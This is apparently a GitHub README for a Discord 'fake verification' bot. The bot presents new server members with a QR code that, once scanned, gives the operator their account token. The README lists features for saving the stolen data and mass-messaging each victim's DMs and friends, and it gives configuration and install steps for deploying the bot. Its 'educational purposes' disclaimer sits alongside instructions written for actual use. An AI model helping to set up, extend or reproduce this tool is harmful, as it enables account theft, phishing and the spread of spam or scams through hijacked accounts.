# Note

<h1 align="center">[Discord] - Fake Verification Bot (V1.0.0)

</h1></h1>
  
 
  <a href="https://www.python.org">
    <img src="https://img.shields.io/badge/Python-3.9-informational.svg">
  </a>
    <img src="https://img.shields.io/badge/covarage-90%25-green">
  </a>
  <a href="https://github.com/issaaadev">
    <img src="https://img.shields.io/github/repo-size/AstraaDev/Fake-Verification-Bot.svg?label=Repo%20size&style=flat-square">
  </a>
  <a href="https://github.com/issaaadev">
 </a>
</p>

<p align="center">
  [Discord] - This Bot is a Script Gathering for Windows systems written in Python.
</p>
<p align="center">
  This Bot allows to create a verification QR Code, that the user will have to scan on his arrival on the server. Once scanned, you will get his information including his Token.
</p>


## Disclaimer

|Bot was made for Educational purposes|
|-------------------------------------------------|
This project was created only for good purposes and personal use.
By using this Bot, you agree that you hold responsibility and accountability of any consequences caused by your actions.

## Features

- Async QR Code Management
- Using Websockets (no browser used)
- Personal QR Code (visible only to the person passing the verification)
- Saves the information in a json file
- Can gives a role to the user after his verification
- Can send a message to all the user's DMs + all user's Friend
- Possibility to define a logs channel

## How To Setup/Install

#### First of all please set your informations in the config.json file!
```json
{
    "botToken": "BOT-TOKEN-HERE", #For more information, read below
    "logs_channel_id": "LOGS-CHANNEL-ID-HERE", #ID of the channel to which the bot logs will be sent
    
    "prefix": "PREFIX-HERE",
    "command_name": "COMMAND-NAME-HERE",
    
    "give_role": false, #Can take the value: true or false
    "role_name": "ROLE-NAME-HERE", #Name of the role you want to give to the user after scanning the QR Code
    
    "mass_dm": 0, #Can take the value: 0 (Disable), 1 (current user's dms), 2 (user's friends), 3 (Current DMs + Friends)
    "message": "MESSAGE-HERE" #Message you want to send to all user's DMs after scanning the QR code
}
```
#### Set up and invite your Bot.
- Create a bot on the [Discord Developer page](https://discord.com/developers/applications)
- Enable all instances in the "Bot" tab
- Invite your bot using this [invite](https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&scope=applications.commands%20bot) (replace CLIENTID by the ID of your Bot)

#### 1st・Installation (Automated installation)
```
Launch the setup.bat file. A new file will be created. You will only have to launch it.
```

#### 2nd・Installation (Manual installation)
```
$ git clone https://github.com/issaaadev/fakeverify.git
$ python -m pip install -r requirements.txt
$ python main.py
```

## Additional Informations
General Informations:
- If you find any malfunction, contact me on Discord: issa#1111.


## Example
![verification_example.png](https://cdn.discordapp.com/attachments/959496233259515915/1009221752527794307/unknown.png?size=4096)



